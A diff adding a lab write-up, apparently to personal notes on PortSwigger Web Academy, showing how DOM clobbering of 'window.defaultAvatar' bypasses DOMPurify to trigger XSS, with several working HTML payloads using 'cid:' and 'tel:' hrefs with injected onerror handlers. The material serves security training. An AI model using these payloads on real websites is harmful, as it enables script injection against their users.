@@ -6,6 +6,64 @@ ignore_macros: true
 
 # PortSwigger Web Academy
 
+## DOM Clobbering
+
+### DOM clobbering to bypass DOMPurify
+
+> Lab: [Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)
+
+Snippet of the vulnerable code:
+
+```js
+let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
+let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
+divImgContainer.innerHTML = avatarImgHTML
+```
+
+The goal is to inject the variable named `window.defaultAvatar` (and `window.defaultAvatar.avatar`) in order to exploit the `innerHTML` function.
+
+Inside the [DOMPurify/src/regexp.js](https://github.com/cure53/DOMPurify/blob/2.0.15/src/regexp.js) file, we can see that different schemes are ALLOWED (encoded double-quote will be decoded at runtime).
+
+```js
+export const IS_ALLOWED_URI = seal(
+  /^(?:(?:(?:f|ht)tps?|mailto|tel|callto|cid|xmpp):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i // eslint-disable-line no-useless-escape
+);
+```
+
+Using the scheme `cid` or `tel` with a string as content will throw an error and then run the javascript `onerror` event. So let's try to create an image like this:
+
+```html
+<img class="avatar" src="tel:notanumber" onerror="alert(1337)">
+```
+
+To do this, we can use DOM Clobbering on the comment section that allows users to put HTML, here is some valid payloads:
+
+```html
+<a id="defaultAvatar"></a>
+<a id="defaultAvatar" name="avatar" href="cid:notanumber&quot; onerror=&quot;alert(1337)"></a>
+
+<!-- or -->
+<a id="defaultAvatar"></a>
+<a id="defaultAvatar" name="avatar" href="cid:notanumber&quot; onerror=alert(1337)//"></a>
+
+<!-- or -->
+<a id="defaultAvatar"></a>
+<a id="defaultAvatar" name="avatar" href="tel:notanumber&quot; onerror=alert(1337)//"></a>
+```
+
+In the developer console:
+
+```js
+> window.defaultAvatar
+HTMLCollection(2) [a#defaultAvatar, a#defaultAvatar, defaultAvatar: a#defaultAvatar, avatar: a#defaultAvatar]
+> window.defaultAvatar.avatar
+<a href=​"cid:​notanumber" onerror="alert(1337)​" name=​"avatar" id=​"defaultAvatar">​</a>​
+> ""+window.defaultAvatar.avatar
+'cid:notanumber" onerror="alert(1337)'
+```
+
+The `defaultAvatar` is successfully injected and the XSS is working!
+
 ## Insecure deserialization
 
 ### Custom gadget chain for Java deserialization
